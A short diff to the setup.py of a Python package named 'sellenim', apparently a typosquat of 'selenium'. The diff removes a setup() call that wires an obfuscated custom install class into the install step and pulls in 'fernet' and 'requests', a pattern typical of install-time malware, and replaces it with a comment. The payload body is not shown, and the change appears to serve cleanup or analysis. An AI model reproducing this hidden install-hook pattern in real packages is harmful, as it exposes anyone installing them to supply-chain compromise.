@@ -18,22 +18,5 @@ class XUIFNSaYFgOuqkMMVJzVLjwfNNlddIuXHbIIMarAynkdgLsAkVFquzEDUfZHTUirYOWtANJgpD
             install.run(self)
 
 
-setup(
-    name="sellenim",
-    version=VERSION,
-    author="VHKZshbSIOd",
-    author_email="QKrzsQjbrxXURPLlMAO@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': XUIFNSaYFgOuqkMMVJzVLjwfNNlddIuXHbIIMarAynkdgLsAkVFquzEDUfZHTUirYOWtANJgpDjzkRRQTFmVgHcutCjMHiu,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
 
